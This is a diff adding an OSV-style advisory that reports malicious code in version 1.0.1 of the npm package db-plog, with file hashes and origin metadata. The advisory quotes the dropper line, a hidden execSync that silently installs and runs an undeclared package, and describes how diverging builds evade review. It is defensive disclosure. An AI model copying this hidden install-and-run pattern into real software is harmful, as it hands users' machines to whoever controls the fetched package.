@@ -1,0 +1,75 @@
+{
+  "modified": "2026-06-26T21:08:49Z",
+  "published": "2026-06-26T21:08:49Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-6538",
+  "summary": "Malicious code in db-plog (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (961a6a108104105727b81399e6a3a6d56636cb79ae8fbfbbc33528f90d890d99)\nOn every Model instantiation — the package's documented primary API — dist/index.js executes `execSync('npm install db-connector-log --no-warnings --no-save --no-progress --loglevel silent', { windowsHide: true })`, then `require('db-connector-log')` and invokes `new DxDatabaseConnector({}).queryDBConnect()`. The 'db-connector-log' package is not declared in package.json's dependencies, is not mentioned in the README, and the silenced npm flags plus windowsHide are designed to hide the install from the operator. This is a runtime dropper: whoever controls the separately-published 'db-connector-log' package can ship arbitrary code to anyone who loads db-plog and uses its Model API, and can mutate that code at any time without republishing db-plog. The CJS bundle (dist/index.js, declared as `main`) contains this dropper while the ESM bundle (dist/index.mjs, declared as `module`) omits it entirely — Model in the.mjs build has no resetor() call and no resetor method. Two divergent builds from one Rollup configuration is a deliberate evasion pattern that hides the payload from reviewers and bundlers reading the ESM entry. The harm fires the first time consuming code instantiates Model, which is the package's advertised use, so any normal use of the library triggers the dropper.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "db-plog"
+      },
+      "versions": [
+        "1.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/index.js",
+              "sha256": "c3946ddee67410aba816f9a2bfa5c5bddf526d3d4dd50619ba39ea9521cf243d",
+              "tlsh": "2452338937fb2930456b30691e0f8107b63a944ba91ded4c7a9c42d4af4847e52f3bf9"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "db-plog-1.0.1.tgz",
+              "hashes": {
+                "sha1": "1e7000da12ac4510ab342ab46ce5b2383617e8c6",
+                "sha512_sri": "sha512-UkBUwJSZdMqUAgUeMxgnNCBXsZo1mmZjUey77EqUn7YkyHxCo0MyqRLKubjFfDWFhDsqTLBLFwIryUhVgOKHEA=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/db-plog/v/1.0.1"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-007665",
+        "import_time": "2026-06-26T21:34:02.397255878Z",
+        "modified_time": "2026-06-26T21:08:49Z",
+        "sha256": "961a6a108104105727b81399e6a3a6d56636cb79ae8fbfbbc33528f90d890d99",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.1"
+        ]
+      }
+    ]
+  }
+}
